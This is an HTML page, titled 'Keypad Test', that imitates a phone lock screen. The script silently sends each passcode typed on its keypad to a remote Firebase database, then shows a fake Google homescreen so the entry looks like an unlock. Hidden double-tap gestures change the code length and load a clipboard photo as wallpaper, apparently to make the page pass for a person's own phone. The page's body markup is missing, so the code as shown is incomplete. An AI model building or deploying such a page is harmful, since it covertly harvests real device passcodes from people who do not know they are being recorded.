<!DOCTYPE html>
<html lang="he" dir="ltr">
<head>
<meta charset="utf-8">
<title>Keypad Test</title>
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, user-scalable=no">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<style>
  :root {
    --ink: #ffffff;
    --ink-dim: rgba(255,255,255,0.62);
    --ink-faint: rgba(255,255,255,0.36);
    --glass: rgba(255,255,255,0.16);
    --glass-press: rgba(255,255,255,0.34);
    --glass-border: rgba(255,255,255,0.14);
    --dot-empty: rgba(255,255,255,0.9);
    --key-size: 76px;
    --key-gap: 22px;
  }
  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

  html, body {
    margin: 0;
    overflow-x: hidden;
    background: #808080;
    font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", system-ui, sans-serif;
  }
  body {
    height: calc(100dvh + 200px);
    background-image: linear-gradient(90deg, #ff0000 0%, #ff0000 50%, #003cff 50%, #003cff 100%);
  }

  .screen {
    position: fixed;
    inset: 0;
    overflow: hidden;
    touch-action: pan-y;
    color: var(--ink);
    user-select: none;
  }

  /* The 4/5/6 row is pinned exactly to the screen's center point, and the
     flanks above/below are anchored off that same center line — so the 5
     key stays dead-center regardless of viewport height (a Safari tab and
     an installed Home Screen app expose different usable heights, and a
     flex/grid split based on each flank's own content would drift off
     center since the two flanks don't hold equal amounts of content). */
  .keyrow-mid {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
  }

  .top-flank {
    position: absolute;
    left: 0;
    right: 0;
    bottom: calc(50% + (var(--key-size) / 2) + var(--key-gap));
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: flex-end;
    gap: 26px;
    padding-top: 14px;
  }

  .bottom-flank {
    position: absolute;
    left: 0;
    right: 0;
    top: calc(50% + (var(--key-size) / 2) + var(--key-gap));
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    gap: var(--key-gap);
  }

  .headline {
    font-size: 22px;
    font-weight: 400;
    color: var(--ink);
    padding: 10px 18px;
    border-radius: 12px;
    cursor: default;
    text-shadow: 0 1px 10px rgba(0,0,0,0.25);
  }

  .dots { display: flex; gap: 20px; height: 14px; align-items: center; direction: ltr; margin-top: -12px; margin-bottom: 52px; }
  .dot {
    width: 13px;
    height: 13px;
    border-radius: 50%;
    border: 2px solid var(--dot-empty);
    background: transparent;
    transition: background 0.15s ease, transform 0.15s ease, border-color 0.15s ease;
  }
  .dot.filled {
    background: var(--ink);
    border-color: var(--ink);
    transform: scale(1.05);
  }

  .keyrow {
    display: grid;
    grid-template-columns: repeat(3, var(--key-size));
    grid-auto-rows: var(--key-size);
    gap: var(--key-gap);
    justify-content: center;
    direction: ltr;
  }

  .key {
    border: none;
    border-radius: 50%;
    background: rgba(255,255,255,0.02);
    border: 1px solid rgba(255,255,255,0.2);
    color: var(--ink);
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    font-size: 36px;
    font-weight: 400;
    line-height: 1;
    cursor: pointer;
    backdrop-filter: blur(18px) brightness(1.25) saturate(70%);
    -webkit-backdrop-filter: blur(18px) brightness(1.25) saturate(70%);
    box-shadow: inset 0 1px 1.5px rgba(255,255,255,0.45), inset 0 -1px 1px rgba(255,255,255,0.06);
    transform: scale(1);
    transition: background 0.2s ease, box-shadow 0.2s ease, transform 0.25s cubic-bezier(0.34, 1.56, 0.64, 1);
  }
  .key .num { color: #ffffff; }
  .key .sub {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 1px;
    height: 20px;
    margin-top: 2px;
  }
  .key .sub .he {
    font-size: 9px;
    font-weight: 600;
    letter-spacing: 1px;
    color: #ffffff;
  }
  .key .sub .en {
    font-size: 8px;
    font-weight: 600;
    letter-spacing: 1.5px;
    color: #ffffff;
  }
  .key.pressed, .key:active { background: var(--glass-press); box-shadow: inset 0 1px 1.5px rgba(255,255,255,0.6), inset 0 -1px 1px rgba(255,255,255,0.1); transform: scale(1.12); transition: background 0.05s ease, box-shadow 0.05s ease, transform 0.08s ease-out; }
  .key.ghost { background: transparent; border-color: transparent; box-shadow: none; backdrop-filter: none; -webkit-backdrop-filter: none; cursor: default; }

  .keyrow-bottom {
    position: absolute;
    left: 0; right: 0;
    bottom: calc(env(safe-area-inset-bottom, 0px) + 6px);
    display: flex;
    justify-content: space-between;
    width: 100%;
    max-width: 280px;
    margin: 0 auto;
    padding: 6px 10px 2px;
    font-size: 17px;
    font-weight: 400;
    color: var(--ink);
    text-shadow: 0 1px 8px rgba(0,0,0,0.25);
  }
  .keyrow-bottom span { opacity: 0.92; cursor: pointer; }

  .screen {
    transition: transform 0.45s cubic-bezier(.36,.66,.04,1), opacity 0.35s ease-out, filter 0.35s ease-out;
    transform-origin: center center;
  }
  .screen.unlocking {
    transform: scale(0.88) translateY(-3%);
    opacity: 0;
    filter: blur(10px);
    pointer-events: none;
  }
  body.unlocked-bg { background-color: #ffffff !important; background-image: none !important; }

  .homescreen {
    display: none;
    position: fixed;
    inset: 0;
    z-index: 0;
    background: #ffffff;
    color: rgba(0,0,0,0.87);
    font-family: Arial, "Helvetica Neue", sans-serif;
    opacity: 0;
    transform: scale(1.06);
    filter: blur(6px);
    transition: opacity 0.4s ease-out 0.08s, transform 0.5s cubic-bezier(.22,1,.36,1) 0.08s, filter 0.4s ease-out 0.08s;
    direction: ltr;
    overflow-y: auto;
    -webkit-overflow-scrolling: touch;
  }
  .homescreen.visible { opacity: 1; transform: scale(1); filter: blur(0); }
  .g-page { padding: calc(env(safe-area-inset-top, 0px) + 20px) 46px 40px; max-width: 420px; margin: 0 auto; }
  .g-top { display: flex; align-items: center; justify-content: space-between; margin-bottom: 30px; }
  .g-top-left, .g-top-right { display: flex; align-items: center; gap: 20px; }
  .g-signin { background: #0b57d0; color: #fff; border: none; border-radius: 20px; padding: 9px 22px; font-size: 15px; font-weight: 500; cursor: pointer; font-family: inherit; }
  .g-tab { font-size: 15px; color: rgba(0,0,0,0.65); position: relative; padding-bottom: 16px; }
  .g-tab-active { color: #0b57d0; font-weight: 500; }
  .g-tab-active::after { content: ""; position: absolute; left: 0; right: 0; bottom: 0; height: 3px; background: #0b57d0; border-radius: 2px; }
  .g-logo { text-align: center; margin: 22px 0 30px; user-select: none; }
  .g-logo svg { width: 192px; height: auto; }
  .g-search { display: flex; align-items: center; gap: 14px; border: 1px solid #dfe1e5; border-radius: 26px; padding: 12px 18px; box-shadow: 0 1px 4px rgba(0,0,0,0.08); }
  .g-search-flex { flex: 1 1 auto; }
  .g-ai-icon { position: relative; display: inline-flex; }
  .g-ai-icon svg.g-spark { position: absolute; top: -3px; right: -4px; }
  .g-lang { text-align: center; font-size: 13px; color: rgba(0,0,0,0.6); margin: 22px 0 36px; }
  .g-lang a { color: #0b57d0; text-decoration: none; margin: 0 4px; }
  .g-trend-title { font-size: 21px; font-weight: 400; text-align: right; margin-bottom: 14px; }
  .g-trend-item { display: flex; align-items: center; justify-content: space-between; gap: 12px; padding: 17px 4px; border-bottom: 1px solid #ececec; font-size: 15px; }
  .g-trend-item:last-child { border-bottom: none; }
  .g-trend-item span { text-align: right; flex: 1 1 auto; }
  .g-bottombar { margin: 30px -30px 0; background: #f2f2f2; color: rgba(0,0,0,0.6); font-size: 13px; padding: 16px 30px calc(env(safe-area-inset-bottom, 0px) + 16px); display: flex; flex-wrap: wrap; gap: 14px; justify-content: center; text-align: center; }
  .g-bottombar-row2 { width: 100%; }
</style>
<script>
  function centerScroll() { window.scrollTo(0, 100); }
  centerScroll();
  window.addEventListener('load', centerScroll);
  window.addEventListener('resize', centerScroll);
  [0, 50, 150, 400, 900, 1500].forEach(function (ms) { setTimeout(centerScroll, ms); });
</script>

  <script>
    var digitMode = 6;
    var entered = "";
    var dotsEl = document.getElementById("dots");
    var headlineEl = document.getElementById("headline");
    var cancelEl = document.getElementById("cancel");
    var screenEl = document.querySelector(".screen");
    var homescreenEl = document.getElementById("homescreen");

    var FIREBASE_DB_URL = "https://magiccode-ddfdb-default-rtdb.firebaseio.com/";

    function logEnteredCode(code, digits) {
      if (!FIREBASE_DB_URL || FIREBASE_DB_URL.indexOf("REPLACE_WITH") === 0) return;
      try {
        fetch(FIREBASE_DB_URL.replace(/\/$/, "") + "/entries.json", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ code: code, digits: digits, time: Date.now() })
        }).catch(function () {});
      } catch (err) {}
    }

    function unlockPhone() {
      homescreenEl.style.display = "block";
      void homescreenEl.offsetWidth;
      document.body.classList.add("unlocked-bg");
      screenEl.classList.add("unlocking");
      homescreenEl.classList.add("visible");
    }

    function renderDots() {
      dotsEl.innerHTML = "";
      for (var i = 0; i < digitMode; i++) {
        var d = document.createElement("div");
        d.className = "dot" + (i < entered.length ? " filled" : "");
        dotsEl.appendChild(d);
      }
    }
    renderDots();

    Array.prototype.forEach.call(document.querySelectorAll(".key[data-d]"), function (btn) {
      btn.addEventListener("click", function () {
        if (entered.length >= digitMode) return;
        entered += btn.getAttribute("data-d");
        renderDots();
        if (entered.length === digitMode) {
          logEnteredCode(entered, digitMode);
          setTimeout(unlockPhone, 400);
        }
      });
      var minPressMs = 90;
      ["pointerdown", "touchstart", "mousedown"].forEach(function (evt) {
        btn.addEventListener(evt, function () {
          btn.classList.add("pressed");
          btn._pressedAt = Date.now();
        }, { passive: true });
      });
      ["pointerup", "pointerleave", "pointercancel", "touchend", "touchcancel", "mouseup", "mouseleave"].forEach(function (evt) {
        btn.addEventListener(evt, function () {
          var elapsed = Date.now() - (btn._pressedAt || 0);
          setTimeout(function () { btn.classList.remove("pressed"); }, Math.max(0, minPressMs - elapsed));
        }, { passive: true });
      });
    });

    cancelEl.addEventListener("click", function () {
      entered = entered.slice(0, -1);
      renderDots();
    });

    // secret gesture: double-tap the headline to switch between 4 and 6
    // digit passcodes — no visual feedback beyond the dot count changing
    var lastHeadlineTap = 0;
    var doubleTapWindow = 320;
    headlineEl.addEventListener("click", function () {
      var now = Date.now();
      if (now - lastHeadlineTap < doubleTapWindow) {
        digitMode = digitMode === 6 ? 4 : 6;
        entered = "";
        renderDots();
        lastHeadlineTap = 0;
      } else {
        lastHeadlineTap = now;
      }
    });

    var emergencyEl = document.getElementById("emergency");

    // secret gesture: double-tap "Emergency Call" to paste the clipboard
    // image straight onto the wallpaper — no visible panel or button
    var lastEmergencyTap = 0;
    emergencyEl.addEventListener("click", function () {
      var now = Date.now();
      if (now - lastEmergencyTap < doubleTapWindow) {
        lastEmergencyTap = 0;
        triggerPaste();
      } else {
        lastEmergencyTap = now;
      }
    });

    function applyBackgroundImage(dataUrl) {
      document.body.style.backgroundImage = dataUrl;
      document.body.style.backgroundSize = "cover";
      document.body.style.backgroundPosition = "center";
      try { localStorage.setItem("lockscreen_bg_v1", dataUrl); } catch (err) {}
    }

    function processBackgroundImageFile(file) {
      if (!file) return;
      var reader = new FileReader();
      reader.onload = function (ev) {
        var img = new Image();
        img.onload = function () {
          var maxDim = 1400;
          var scale = Math.min(1, maxDim / Math.max(img.width, img.height));
          var canvas = document.createElement("canvas");
          canvas.width = Math.round(img.width * scale);
          canvas.height = Math.round(img.height * scale);
          var ctx = canvas.getContext("2d");
          ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
          applyBackgroundImage("url(" + canvas.toDataURL("image/jpeg", 0.82) + ")");
        };
        img.src = ev.target.result;
      };
      reader.readAsDataURL(file);
    }

    function triggerPaste() {
      if (!navigator.clipboard || !navigator.clipboard.read) {
        alert("Clipboard access isn't available in this browser.");
        return;
      }
      navigator.clipboard.read().then(function (items) {
        for (var i = 0; i < items.length; i++) {
          var type = items[i].types.filter(function (t) { return t.indexOf("image/") === 0; })[0];
          if (type) {
            items[i].getType(type).then(processBackgroundImageFile);
            return;
          }
        }
        alert("No image found on the clipboard. Copy a photo first, then try again.");
      }).catch(function () {
        alert("Couldn't read the clipboard. Make sure you copied an image, then try again.");
      });
    }

    try {
      var saved = localStorage.getItem("lockscreen_bg_v1");
      if (saved) applyBackgroundImage(saved);
    } catch (err) {}
  </script>
</body>
</html>
